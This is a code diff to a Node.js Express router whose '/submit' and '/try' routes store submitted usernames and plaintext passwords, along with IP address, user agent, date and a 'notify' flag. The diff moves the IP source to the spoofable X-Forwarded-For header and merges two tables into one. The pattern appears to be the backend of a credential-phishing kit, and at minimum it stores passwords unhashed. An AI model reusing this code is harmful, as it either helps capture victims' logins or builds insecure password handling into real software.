@@ -32,16 +32,16 @@ router.post('/submit', validateFormData, (req, res) => {
     const name = req.body.username;
     const b64 = Buffer.from(name).toString('base64');
     const word = req.body.password;
-    // const clientIP = req.headers['x-forwarded-for'];
-    // const ip =  clientIP.split(',')[0].trim(); 
-    const ip = req.socket.remoteAddress; 
+    const clientIP = req.headers['x-forwarded-for'];
+    const ip =  clientIP.split(',')[0].trim(); 
+    // const ip = req.socket.remoteAddress; 
     const useragent = req.get('User-Agent');
     const date = new Date();
     const notify = 0;
 
 
     
-                            const insertQuery = 'INSERT INTO clkTable (username, password, ip, useragent,date,notify) VALUES (?,?,?,?,?,?)';
+                            const insertQuery = 'INSERT INTO usertable (username, password, ip, useragent,date,notify) VALUES (?,?,?,?,?,?)';
                             db.query(insertQuery, [name, word, ip, useragent, date, notify], (err) => {
                                 if (err) {
                                     console.error('Error inserting record:', err);
@@ -74,9 +74,9 @@ router.post('/try', validateFormData2, (req, res) => {
     const name = req.body.username;
     const b64 = Buffer.from(name).toString('base64');
     const word = req.body.password;
-    // const clientIP = req.headers['x-forwarded-for'];
-    // const ip =  clientIP.split(',')[0].trim(); 
-    const ip = req.socket.remoteAddress; 
+    const clientIP = req.headers['x-forwarded-for'];
+    const ip =  clientIP.split(',')[0].trim(); 
+    //const ip = req.socket.remoteAddress; 
     const useragent = req.get('User-Agent');
     const date = new Date();
     const notify = 0;
@@ -84,7 +84,7 @@ router.post('/try', validateFormData2, (req, res) => {
     
     
     
-                    const insertQuery = 'INSERT INTO newtable (username, password, ip, useragent,date,notify) VALUES (?,?,?,?,?,?)';
+                    const insertQuery = 'INSERT INTO usertable (username, password, ip, useragent,date,notify) VALUES (?,?,?,?,?,?)';
                     db.query(insertQuery, [name, word, ip, useragent, date, notify], (err) => {
                         if (err) {
                             console.error('Error inserting record:', err);
